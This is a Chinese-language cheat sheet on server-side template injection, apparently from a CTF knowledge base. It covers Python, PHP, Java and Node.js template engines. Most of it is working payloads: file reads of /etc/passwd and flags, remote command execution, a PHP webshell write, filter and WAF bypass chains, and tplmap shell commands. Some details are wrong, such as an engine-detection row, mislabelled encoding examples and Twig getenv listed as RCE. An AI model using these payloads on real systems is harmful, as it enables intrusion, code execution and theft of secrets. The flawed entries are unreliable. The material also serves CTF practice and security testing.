# SSTI（服务器端模板注入）

> 创建: 未知 | 更新: 2026-05-21 | 适用: Python(Flask/Jinja2)/PHP(Twig/Smarty)/Java(FreeMarker/Velocity)/Node.js(Nunjucks/EJS)

---

## 一、SSTI 检测与确认

### 1.1 常见探测 Payload

```python
# 数学运算检测（最常用）
{{7*7}}              # 输出49 → 确认SSTI
{{7*'7'}}            # Jinja2输出7777777, Twig输出49
${7*7}               # 表达式语法
#{7*7}               # 模板语法
<%=7*7%>             # ERB风格
${{7*7}}             # 可变语法
#{7*7}               # 表达式语法

# 配置探测
{{config}}           # Flask配置信息
{{config.items()}}   # 遍历所有配置项
{{self}}             # 查看模板对象
{{url_for.__globals__}}  # Flask url_for全局对象

# 字符串操作
{{'test'.upper()}}   # 确认模板引擎
{{''.__class__}}     # 获取字符串类
```

### 1.2 常用引擎识别

| 语法特征 | 引擎 | 语言 |
|---------|------|------|
| `{{7*7}}` → `49` | Jinja2/Twig | Python/PHP |
| `${{7*7}}` → `49` | Tornado | Python |
| `${7*7}` → `49` | Smarty/Mako | PHP/Python |
| `#{7*7}` → `49` | Pug/Jade | Node.js |
| `<%=7*7%>` → `49` | EJS/ERB | Node.js/Ruby |
| `{{7*7}}` → `7777777` | Jinja2 | Python |

---

## 二、Python Flask/Jinja2 完整攻击链

### 2.1 获取基础对象

```python
# 获取字符串类
{{''.__class__}}
{{"".__class__}}
{{[].__class__}}

# 获取基类 (object)
{{''.__class__.__mro__[2]}}           # 方法1: MRO链
{{''.__class__.__bases__[0]}}         # 方法2: bases
{{''.__class__.__base__}}             # 方法3: base
{{().__class__.__bases__[0]}}         # 方法4: 元组类

# 获取所有子类
{{''.__class__.__mro__[2].__subclasses__()}}
{{[].__class__.__base__.__subclasses__()}}
```

### 2.2 文件读取

```python
# 方法1: FileLoader (索引40, 常见)
{{''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()}}
{{[].__class__.__base__.__subclasses__()[40]('flag').read()}}

# 方法2: 通过 __builtins__.open
{{url_for.__globals__['__builtins__']['open']('flag').read()}}
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}

# 方法3: 通过 file (Python 2)
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()}}

# 方法4: 文件写
{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php @eval($_POST[1]);?>')}}
{{().__class__.__bases__[0].__subclasses__()[40]('/tmp/shell','w').write('content')}}
```

### 2.3 命令执行（核心 payload）

**通用版（无需猜索引，推荐）**:

```python
# 使用 catch_warnings 的 for 循环版
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
  {% endif %}
{% endfor %}

# 命令执行版
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") }}
  {% endif %}
{% endfor %}

# 文件读取版
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].open('filename','r').read() }}
  {% endif %}
{% endfor %}
```

**固定索引版（需要先确认版本）**:

```python
# os.popen — 最直接 (索引258: os._wrap_close)
{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}

# subprocess.Popen
{{''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()}}
{{''.__class__.__mro__[2].__subclasses__()[258]('cat /flag',shell=True,stdout=-1).communicate()[0].strip()}}

# eval+os.popen
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}

# os.system
{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')}}
{{[].__class__.__base__.__subclasses__()[76].__init__.__globals__['os'].system('ls')}}

# commands (Python 2)
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')}}
```

### 2.4 常见 subclass 索引参考

| 类 | 用途 | Python 2.7 | Python 3.6/3.7 | Python 3.8+ |
|----|------|-----------|----------------|-------------|
| `os._wrap_close` | 命令执行 | ~258 | ~258 | ~258 |
| `FileLoader` | 文件读写 | ~40 | ~40 | ~40 |
| `catch_warnings` | 通用入口 | ~59 | ~59 | ~59 |
| `_IterationGuard` | os模块入口 | ~71 | ~76 | — |

> 不同环境索引不同，推荐使用 for 循环通用版，或先用 `__subclasses__()` 列出确认索引。

### 2.5 获取config/request对象

```python
{{config}}                            # Flask配置
{{config.SQLALCHEMY_DATABASE_URI}}    # 数据库连接
{{config.SECRET_KEY}}                 # 密钥
{{request}}                           # 请求对象
{{request.environ}}                   # 环境变量
{{url_for.__globals__}}               # 全局函数
{{g}}                                 # Flask g对象
{{get_flashed_messages.__globals__}}  # 消息全局
```

---

## 三、Jinja2 过滤器绕过（WAF Bypass）

### 3.1 字符串拼接绕过关键字过滤

```python
# 过滤了 __ 的情况
{{''.__class__}}                           # 正常
{{""|attr("__class__")}}                    # 使用 attr 过滤器
{{()|attr('__cla'+'ss__')}}                 # 字符串拼接

# 过滤了 class 的情况
{{['__cla','ss__']|join}}                   # join 拼接
{{()|attr(['__cla','ss__']|join)}}

# 过滤了 [] 的情况
{{()|attr(request.args.a)}}&a=__class__     # 通过GET参数传递
{{()|attr(config.a)}}                       # 通过配置传递

# 过滤了 [] 和 . 的情况
{{()|attr(request.cookies.get('a'))}}       # Cookie传递属性名

# 过滤单引号/双引号的情况
{{()|attr(request.args.a)}}&a=__class__     # GET参数传值
{{()|attr((request.args.a,request.args.b)|join)}}&a=__cla&b=ss__  # 分片传
```

### 3.2 用 request 对象绕过

```python
{{''.__class__.__mro__[2].__subclasses__()[258](request.args.cmd,shell=True,stdout=-1).communicate()}}&cmd=id

# 用 headers 传递
{{''.__class__.__mro__[2].__subclasses__()[258](request.headers.cmd,shell=True,stdout=-1).communicate()}}
# Header: cmd: id

# 用 cookies 传递
{{''.__class__.__mro__[2].__subclasses__()[258](request.cookies.cmd,shell=True,stdout=-1).communicate()}}
# Cookie: cmd=id
```

### 3.3 编码绕过

```python
# Base64编码
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['__im'+'port__']('o'+'s').__dict__['po'+'pen'](request.args.a).read()}}&a=Y2F0IC9mbGFn

# Hex编码
{{''.__class__.__mro__[2].__subclasses__()[258](request.args.a,shell=True,stdout=-1).communicate()}}&a=cat%20/flag

# Unicode编码
{{()|attr('__class__')}}
```

### 3.4 通过 lipsum + cycler 构造

```python
{% set ns = namespace(f='') %}
{% set ns.f = lipsum.__globals__['os'].popen('id').read() %}
{{ns.f}}

{% set ns = namespace(f='') %}
{% set ns.f = cycler.__init__.__globals__['os'].popen('id').read() %}
{{ns.f}}
```

### 3.5 `{{}}` 被禁时改用 `{%%}` + `print`

`{{ }}` 是**表达式输出**，`{% %}` 是**语句**。禁了 `{{` 但没禁 `{%` 时，用 `print` 语句把结果打出来：

```jinja
{% print(lipsum.__globals__.os.popen('id').read()) %}
```

`{% set %}` 赋值后同样能输出：

```jinja
{% set x = lipsum.__globals__.os.popen('id').read() %}{% print(x) %}
```

**判据**：报错或过滤提示针对 `{{` / `}}`，但 `{%` / `%}` 仍可用。

### 3.6 无字面量构造：`dict(...)|join`

**引号和下划线全禁**时（`['"]`、`_` 都在黑名单），`dict(po=a,p=a)|join` 能在不写任何字符串字面量的前提下生成 `pop`：

```jinja
{# dict(po=a,p=a)|join → "pop"  #}
{% set po = dict(po=a,p=a)|join %}
{% set a  = (()|select|string|list)|attr(po)(24) %}   {# 取到一个下划线字符 '_' #}
{% set ini = (a,a,dict(init=a)|join,a,a)|join() %}     {# → "__init__" #}
{% set glo = (a,a,dict(globals=a)|join,a,a)|join() %}  {# → "__globals__" #}
{% set geti= (a,a,dict(getitem=a)|join,a,a)|join() %}  {# → "__getitem__" #}
{% set b   = (a,a,dict(builtins=a)|join,a,a)|join() %} {# → "__builtins__" #}
{% set x   = (lipsum|attr(ini)|attr(glo)|attr(geti))(b) %}
{% print(x.open('/flag').read()) %}
```

**为什么 `dict(po=a,p=a)|join` 能出 `pop`**：`join` 过滤器对 dict 迭代的是**键**，`po` 和 `p` 两个键去重后是 `{po, p}`，join 结果 `"po"+"p"` = `"pop"`。

**为什么 `(()|select|string|list)|attr('pop')(24)` 是下划线**：空元组的 `select` 迭代器转成字符串是 `<generator object select_or_reject at 0x...>`，`list` 化后取下标能捞到 `_`（`__` 在 `select_or_reject` 里）。下标随 Python 版本变，**24 只是常见值，先试 24 / 25 / 26**。

**判据**：过滤器同时禁 `'` `"` `_`，但允许 `|`（过滤器）和 `dict`/`select`/`string`/`list` 这些名字 —— 这就是「无字面量构造」的完整前提。

### 3.7 关键字被拦时的等价名

`__globals__` 被拦不代表路断了，同一个模块字典还有别的入口：

```jinja
{{lipsum.__globals__}}                     {# 被拦 #}
{{lipsum|attr('__glo'+'bals__')}}          {# 拼接 #}
{{lipsum.__init__.__globals__}}            {# 换前缀，绕「__globals__ 前必须是函数」类正则 #}
{{cycler.__init__.__globals__}}
{{namespace.__init__.__globals__}}
{{joiner.__init__.__globals__}}
```

**判据**：`lipsum` / `cycler` / `joiner` / `namespace` 是 Jinja2 注入的**全局函数**，四个都有 `__globals__`。拦了一个就换另一个。

**`__subclasses__` 被清空时**：`().__class__.__bases__[0].__subclasses__()` 返回空表，说明沙箱删了 `__subclasses__` 的结果或过滤了它。此时走 `globals` 路线（上面四个函数），不要死磕 `subclasses`。

### 3.8 任意标识符都能当 `__init__` 入口

**最省事的判据**：模板里任何**已存在的变量名**都能接 `.__init__.__globals__`，因为它最终落到 `object.__init__`：

```jinja
{{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}
{{config.__init__.__globals__['__builtins__'].open('/flag').read()}}
{{url_for.__globals__['__builtins__']['eval']("...")}}
{{request.__init__.__globals__}}
```

`x` 可以是 `config`、`request`、`url_for`、`lipsum`、`self`、甚至 `flag`（若上下文里有）—— **名字本身不重要，只要它是个对象**。

**为什么能行**：`obj.__init__` 拿的是**类的构造函数**（`object.__init__`），而 `object.__init__.__globals__` 就是 `builtins` 所在的模块字典。

**判据**：`__class__` / `__mro__` / `__subclasses__` 被禁，但还能写 `.__init__.__globals__` —— 这条路**不经过 `__class__`**，很多过滤器只拦前者。

**按名字找 `os._wrap_close` 而不是记索引**（索引随 Python 版本变，名字不变）：

```jinja
{% for c in ''.__class__.__base__.__subclasses__() %}
  {% if c.__name__ == '_wrap_close' %}
    {% print(c.__init__.__globals__['popen']('id').read()) %}
  {% endif %}
{% endfor %}
```

**判据**：写死索引（`[258]`、`[138]`）的 payload 换环境就废。**按 `__name__` 匹配是唯一可移植的写法**，代价是 payload 变长、可能需要 `{%for%}`。

---

## 四、其他 Python 模板引擎

### 4.1 Tornado

```python
# Tornado 使用 {{ ... }} 表达式
{% import os %}{{os.popen('id').read()}}
{% raw '<?php @eval($_POST[1]);?>' %}
{{handler.settings}}                      # 获取配置
{{__import__('os').popen('id').read()}}
```

### 4.2 Mako

```python
<%
import os
x = os.popen('id').read()
%>
${x}
```

---

## 五、PHP 模板引擎

### 5.1 Twig (Symfony)

```php
# 基础探测
{{7*7}}                # 输出49
{{dump(app)}}          # dump应用对象

# 文件读取
{{'/etc/passwd'|file_excerpt(1,30)}}

# RCE — 通过 registerUndefinedFunctionCallback
{{_self.env.registerUndefinedFunctionCallback("exec")}}
{{_self.env.getFilter("cat /flag")}}

# RCE — 通过 sort filter
{{['cat /flag 2>&1']|sort('exec')}}
{{['id']|filter('system')}}

# RCE — 通过 map filter
{{['id']|map('passthru')}}

# RCE — 通过 getenv
{{['id']|map('getenv')}}
```

### 5.2 Smarty (PHP)

```php
# 老版本 RCE (Smarty < 3.1.32)
{system('id')}
{Smarty_Internal_Write_File::writeFile(['shell.php'], ['<?php @eval($_POST[1]);?>'])}

# 新版本
{math equation="system('id')"}
{self::getStreamVariable("php://filter/read=convert.base64-encode/resource=/etc/passwd")}
```

---

## 六、Java 模板引擎

### 6.1 Jinjava (Java Jinja2)

```java
{{Runtime.getRuntime().exec("id")}}

# 反射调用
{{'a'.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')}}
```

### 6.2 FreeMarker (Java)

```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# 读取对象
${object.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")}
```

### 6.3 Velocity (Java)

```java
#set($s="")
#set($stringClass=$s.getClass())
#set($rt=$stringClass.forName("java.lang.Runtime"))
#set($ex=$rt.getMethod("getRuntime"))
#set($obj=$ex.invoke(null))
$obj.exec("id")
```

---

## 七、Node.js 模板引擎

### 7.1 EJS

```javascript
<%= global.process.mainModule.constructor._load('child_process').execSync('id').toString() %>
```

### 7.2 Pug / Jade

```javascript
- var x = global.process.mainModule.require('child_process').execSync('id')
p= x

#{global.process.mainModule.require('child_process').execSync('id').toString()}
```

### 7.3 Nunjucks

```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

### 7.4 Handlebars

```javascript
{{#with "s" as |range|}}
{{#with (lookup range.constructor "return global.process.mainModule.require('child_process').execSync('id').toString()")}}
{{/with}}
{{/with}}
```

---

## 八、常用工具

| 工具 | 用途 | 链接 |
|------|------|------|
| tplmap | 自动化SSTI检测和利用（Python/Flask/PHP） | `pip install tplmap` |
| SSTImap | tplmap的升级版 | 搜索 GitHub |
| TplSploit | SSTI利用框架 | 搜索 GitHub |

```bash
# tplmap 用法示例
./tplmap.py -u 'http://target.com/?name=test'          # 基础检测
./tplmap.py -u 'http://target.com/?name=test' --os-shell  # 获取shell
./tplmap.py -u 'http://target.com/?name=test' --os-cmd 'cat /flag'
```

---

## 九、常见坑点与技巧

1. **Python版本差异**: Python2的subclass索引和Python3不同，优先使用 for 循环通用版
2. **session/cookie传递**: 当payload太长被截断时，通过request对象分片传递
3. **单双引号转换**: `''.__class__` 和 `"".__class__` 等价，但前者更短
4. **空白分隔**: `{{config}}` 前后可加空格或换行，对解析无影响
5. **盲注**: 无回显时用 `{% if ... %}` 配合 curl 外带数据
6. **import 限制**: 有时 `__import__('os')` 被过滤，可用 `eval('__im'+'port__("os")')` 绕过
7. **Flask Debug模式**: 如果开启了debug，可通过错误页面执行代码

---

## 相关资源

- **引擎识别与绕过**: [[web/漏洞分类/注入类/服务端注入总入口.md|服务端注入总入口 §3]] | [[web/漏洞分类/注入类/服务端高级技巧.md|服务端高级技巧 §4]]
- **关联**: [[web/实战打法/什么是rce.md|命令执行.md]] — SSTI最终效果是RCE | [[web/实战打法/JWT（JSON Web Token）安全.md|JWT.md]] — JWT中的SSTI利用
- **代码审计**: 模板注入通常通过Flask/Jinja2审计发现 | [[web/实战打法/PHP 代码审计.md|php代码审计.md]] — Twig模板审计
- **Payload速查**: [[web/载荷与字典/Payload 速查表.md|PAYLOAD-CHEATSHEET.md]] 第四节
- **找同类题**: `kb_search("SSTI 模板注入 Jinja2")`
